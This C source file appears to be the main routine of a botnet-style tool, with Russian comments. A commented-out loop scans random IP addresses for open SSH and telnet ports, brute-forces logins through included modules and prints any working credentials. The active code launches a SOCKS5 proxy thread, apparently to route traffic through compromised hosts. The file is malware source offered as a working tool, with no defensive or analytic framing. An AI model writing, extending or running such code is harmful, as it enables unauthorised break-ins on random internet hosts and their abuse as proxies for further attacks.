#include "bruteforce/ssh_bruteforce.c"
#include "bruteforce/telnet_bruteforce.c"
#include "socks5/proxy.h"
#include "include/includes.h"

int main (){


    // char ip_address[IP_ADDRESS_LENGTH];
    // while (1) {
    //     generate_random_ip(ip_address, IP_ADDRESS_LENGTH);
    //     printf("Проверка IP: %s", ip_address);
    //     fflush(stdout);

    //     //
    //     if (check_port_open_on_ip(ip_address, SSH_PORT) == 1) {
    //         Credentials ssh_credentials = ssh_brute(ip_address);
    //         if (ssh_credentials.good) {printf("Успешный вход: %s:%s\n", ssh_credentials.username, ssh_credentials.password); fflush(stdout);}
    //         else {printf("Не удалось войти на %s\n", SSH_HOST); fflush(stdout);}
    //     }

    //     if (check_port_open_on_ip(ip_address, TELNET_PORT) == 1) {
    //         Credentials telnet_credentials = telnet_brute(ip_address);
    //         if (telnet_credentials.good) {printf("Успешный вход: %s:%s\n", telnet_credentials.username, telnet_credentials.password); fflush(stdout);}
    //         else {printf("Не удалось войти на %s\n", TELNET_HOST); fflush(stdout);}
    //     }
    //     //
    // }

    pthread_t sks5_thread;

    // Создание потока
    if (pthread_create(&sks5_thread, NULL, main_socks, NULL) != 0) {
        fprintf(stderr, "Ошибка при создании потока\n");
        return 1;
    }

    // Ожидание завершения потока
    if (pthread_join(sks5_thread, NULL) != 0) {
        fprintf(stderr, "Ошибка при ожидании завершения потока\n");
        return 1;
    }


    return 0;
}